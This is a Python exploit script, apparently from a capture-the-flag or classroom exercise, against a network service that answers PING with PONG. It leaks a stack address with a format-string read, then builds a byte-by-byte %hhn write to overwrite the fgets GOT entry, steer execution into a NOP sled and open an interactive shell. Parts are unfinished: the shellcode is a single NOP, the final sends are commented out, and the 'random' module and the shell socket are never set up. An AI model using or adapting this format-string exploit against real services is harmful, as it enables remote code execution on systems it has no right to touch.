
#!/usr/bin/python


# bt: me()->cory(video_recording)->cseagle(god_mode)

import struct
import socket
import sys
import time
import binascii
import os
import math
import md5
import re
import hashlib
import telnetlib
import base64

alphanum = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

def rnd_string(sz):
   res = ''
   for i in xrange(sz):
      res += alphanum[random.randrange(0, len(alphanum))]
   return res

def p(f, *args):
   return struct.pack(f, *args)

def u(f, v):
   return struct.unpack(f, v)

def hx(s):
   return binascii.hexlify(s)

def ux(s):
   return binascii.unhexlify(s)

def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def rl(s):
  return ru(s, '\n')

def interact(s):
   t = telnetlib.Telnet()
   t.sock = s
   t.interact()

if len(sys.argv) != 2:
   print "usage: python prog.py <ip> <port>"
   sys.exit(0)

_fgets = 0x601048 		#_fgets GOT
slide = 24			#adjust tgt to land in NOP sled


tgthost = sys.argv[1]
tgtport = 4444 #int(sys.argv[2])
#shellport = 5823

target = (tgthost, tgtport)
#shell = (tgthost, shellport)

s = socket.socket()
#b = socket.socket()

s.connect(target)

#DO THE FUN STUFF HERE

#SHELLCODE == XX Bytes
shellcode = ""
shellcode += "\x90"

nop = ""
nop += "\x90"

nl = ""
nl += "\x0a"

# Send "PING " + "
s.send("PING " + "%4$p" + nl)
ru(s, "PONG 0x")

leak = int(rl(s).strip(), 16)   #for networked leak
#print "Buffer Leak: 0x%x" % leak

tgt = leak + slide
#print "Target Address: 0x%x" % tgt

bytes = p("<Q", tgt)[:6]

# Generate format string to overwrite GOT
total = 0
idx = 15
fmt = ''
for b in bytes:
	value = ord(b)
	need = (value -total) & 0xff
	fmt += "%%%dc" % need
	fmt += "%%%d$hhn" % idx
	idx += 1
	total += need

fmt = fmt.ljust(72, 'A')   # Justify with A's

# Add address of _fgets() GOT
for i in range(6):
	fmt += p("<Q", _fgets + i)
print fmt

# Send shellcode
#s.send("PING " + nop*48 + shellcode + nl)

# Send final format string to modify GOT	
#s.send("PING " + fmt + nl) 			#This length must not overwrite past tgt pointer!

# Once you have a shell on some socket s, maybe that's the
# same socket at above, maybe it's a new socket, then interact
# will use telnetlib to handle the asynchronous I/O needed to
# interact with your shell

#b.connect(shell)
interact(b)



